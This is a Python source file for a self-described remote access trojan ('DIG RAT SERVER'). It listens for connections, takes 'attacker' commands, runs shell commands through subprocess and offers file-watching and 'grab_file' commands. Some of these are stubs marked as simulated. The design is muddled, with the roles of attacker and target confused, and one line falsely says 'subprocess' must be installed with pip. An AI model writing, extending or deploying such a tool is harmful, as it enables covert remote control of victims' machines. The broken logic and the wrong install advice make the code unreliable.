import socket
import threading
import os
import time
from datetime import datetime

# --- Configuration ---
HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 9999       # Default port
MAX_BUFFER_SIZE = 4096

class FileMonitor:
    """
    A class to simulate or handle the active monitoring of a local file system.
    If the target is local, this runs real-time monitoring. If the target is remote, 
    this logic resides on the target machine (client).
    """
    def __init__(self, target_path):
        self.target_path = target_path
        self.last_scan_time = time.time()
        print(f"[Monitor] Initializing watch on path: {target_path}")

    def check_for_changes(self):
        """Simple simulation: In a real scenario, this would use inotify or similar."""
        # For simplicity, we just report status, but in a real RAT, you'd compare file hashes/timestamps
        current_time = time.time()
        if current_time - self.last_scan_time > 5: # Check every 5 seconds
            self.last_scan_time = current_time
            print(f"--- MONITORING SNAPSHOT: Checked {self.target_path} ---")
            # In a real setup, this is where you'd check for new/modified files
            # For this simulation, we just confirm the path is accessible.
            return True
        return False


def handle_client(client_socket, client_address):
    """Handles all communication with a single connected client (target)."""
    print(f"\n{'='*50}")
    print(f"[+] Connection established with {client_address}")
    print(f"{'='*50}")

    # State variable to hold any active monitor instance if the target is known
    active_monitor = None 

    try:
        while True:
            # 1. Receive command from Attacker
            try:
                command = client_socket.recv(MAX_BUFFER_SIZE).decode('utf-8').strip()
            except socket.error:
                print(f"[!] Socket error while receiving data.")
                break

            if not command:
                print("[*] Client disconnected cleanly.")
                break

            print(f"\n[ATTACKER INPUT] >>> {command}")
            output = ""

            # --- COMMAND PARSING ---
            command_parts = command.split()
            cmd = command_parts[0].lower()

            if cmd == 'exit':
                output = "Session terminated successfully."
                break

            elif cmd == 'watch':
                if len(command_parts) < 2:
                    output = "Usage: watch <path>"
                else:
                    path = ' '.join(command_parts[1:])
                    # Initialize or switch the monitor
                    if active_monitor and active_monitor.target_path != path:
                         # If changing monitor, you'd need complex state management
                         output = f"Monitor already active on {active_monitor.target_path}. To change, use /stop."
                    else:
                        # Initialize the file watcher simulation
                        active_monitor = FileMonitor(path)
                        output = f"Starting real-time monitoring for path: {path}. Type 'stop' to disable monitoring."

            elif cmd == 'stop_monitor':
                if active_monitor:
                    active_monitor = None
                    output = "File monitoring stopped."
                else:
                    output = "No monitor is currently active."

            # --- Basic Shell Commands (The core RAT function) ---
            elif cmd in ('ls', 'cd', 'pwd', 'whoami', 'ipconfig'):
                # Execute basic OS commands
                try:
                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=10)
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Execution Error: {e}"

            # --- File Extraction/Download (Simulated Capture) ---
            elif cmd == 'grab_file' and len(command_parts) >= 2:
                file_to_grab = ' '.join(command_parts[1:])
                output = f"Attempting to retrieve {file_to_grab}..."
                try:
                    # In a real scenario, you'd use shutil.copytree or requests here
                    output += f"\n[SIMULATED SUCCESS]: File '{file_to_grab}' successfully copied locally."
                except Exception as e:
                    output += f"\n[FAILURE]: Could not grab file: {e}"

            else:
                output = "Unknown command. Available: ls, cd, watch <path>, grab_file <filename>, exit."

            # Send the resulting output back to the client
            client_socket.send(output.encode('utf-8'))

    except ConnectionResetError:
        print(f"\n[!!!] Connection forcibly closed by {client_address}.")
    except Exception as e:
        print(f"\n[!!!] A critical error occurred: {e}")
    finally:
        client_socket.close()
        print(f"[+] Connection closed with {client_address}")


def start_rat_server(host, port):
    """Initializes and runs the main listening socket."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allows quick restart
    server.bind((host, port))
    server.listen(5)
    print("="*60)
    print(f"✨ DIG RAT SERVER ONLINE ✨ Listening on {host}:{port}")
    print("Commands: ls, cd, watch <path>, grab_file <filename>, exit")
    print("="*60)

    while True:
        try:
            client_socket, client_address = server.accept()
            # Use threading for concurrency (allowing multiple targets)
            client_handler = threading.Thread(
                target=handle_client, 
                args=(client_socket, client_address)
            )
            client_handler.daemon = True # Allows the thread to die when main program exits
            client_handler.start()
        except KeyboardInterrupt:
            print("\n[!] Server shutting down via interrupt.")
            break
        except Exception as e:
            print(f"\n[!!!] Server error: {e}")
            break

if __name__ == "__main__":
    # Ensure subprocess is available for OS commands
    try:
        import subprocess
    except ImportError:
        print("FATAL: 'subprocess' module is required. Run 'pip install subprocess' if needed.")
        exit()

    start_rat_server(HOST, PORT)
